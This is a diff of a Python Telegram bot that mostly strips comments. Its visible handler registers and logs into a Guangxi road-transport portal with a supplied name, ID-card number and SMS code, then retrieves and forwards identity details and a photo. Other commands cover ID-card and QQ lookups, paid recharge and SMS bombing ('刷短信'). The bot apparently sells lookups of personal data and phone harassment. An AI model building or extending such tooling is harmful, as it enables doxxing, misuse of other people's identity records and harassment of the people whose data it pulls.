     phone = context.user_data['gx_phone']
     captcha = context.user_data['gx_captcha']
     session = context.user_data['gx_session']
-
     update.message.reply_text("⏳ 正在注册账号...")
     ok, msg = gx_register(session, phone, sms_code, captcha, name, id_card)
     if not ok:
         update.message.reply_text(f"❌ 注册失败：{msg}")
         context.user_data.clear()
         return ConversationHandler.END
-
     update.message.reply_text("✅ 注册成功！正在登录并查询信息...")
     ok2, msg2 = gx_login(session, id_card, GX_PASSWORD)
     if not ok2:
         update.message.reply_text(f"⚠️ 注册成功但登录失败：{msg2}，请稍后手动查询")
         context.user_data.clear()
         return ConversationHandler.END
-
-    # 查询
     success, data = gx_query_photo(session, name, id_card)
     if success:
         item2 = data.get("item2", {})
         if item2:
-            info_text = gx_format_info(item2)
-            update.message.reply_text(info_text)
+            update.message.reply_text(gx_format_info(item2))
         else:
             update.message.reply_text("⚠️ 未获取到身份文字信息")
         file_id = data.get("item1")
@@ -1429,7 +1364,6 @@ def main():
     bot=updater.bot
     dp=updater.dispatcher
 
-    # 注册命令
     dp.add_handler(CommandHandler("start", start))
     dp.add_handler(CommandHandler("hainansf", hainansf))
     dp.add_handler(CommandHandler("cx", cx))
@@ -1440,7 +1374,6 @@ def main():
     dp.add_handler(CommandHandler("rh", rh))
     dp.add_handler(CommandHandler("cancel", cancel))
 
-    # /okcz 对话
     dp.add_handler(ConversationHandler(
         entry_points=[CommandHandler('okcz', okcz_start)],
         states={RECHARGE_AMOUNT: [MessageHandler(Filters.text, okcz_amount)]},
@@ -1448,7 +1381,6 @@ def main():
         allow_reentry=True
     ))
 
-    # /sfz 对话
     dp.add_handler(ConversationHandler(
         entry_points=[CommandHandler('sfz', sfz_start)],
         states={
@@ -1463,7 +1395,6 @@ def main():
         allow_reentry=True
     ))
 
-    # /plc 对话
     dp.add_handler(ConversationHandler(
         entry_points=[CommandHandler('plc', plc_start)],
         states={
@@ -1477,7 +1408,6 @@ def main():
         allow_reentry=True
     ))
 
-    # /qf 对话
     dp.add_handler(ConversationHandler(
         entry_points=[CommandHandler('qf', qf_start)],
         states={QF_QQ: [MessageHandler(Filters.text, qf_qq)]},
@@ -1485,7 +1415,6 @@ def main():
         allow_reentry=True
     ))
 
-    # /2ys 身份验证对话
     dp.add_handler(ConversationHandler(
         entry_points=[CommandHandler('2ys', ys_start)],
         states={
@@ -1496,7 +1425,6 @@ def main():
         allow_reentry=True
     ))
 
-    # /sms 刷短信对话
     dp.add_handler(ConversationHandler(
         entry_points=[CommandHandler('sms', sms_start)],
         states={
@@ -1509,7 +1437,6 @@ def main():
         allow_reentry=True
     ))
 
-    # /gxlys 广西道路运输查询/注册
     dp.add_handler(ConversationHandler(
         entry_points=[CommandHandler('gxlys', gx_start)],
         states={
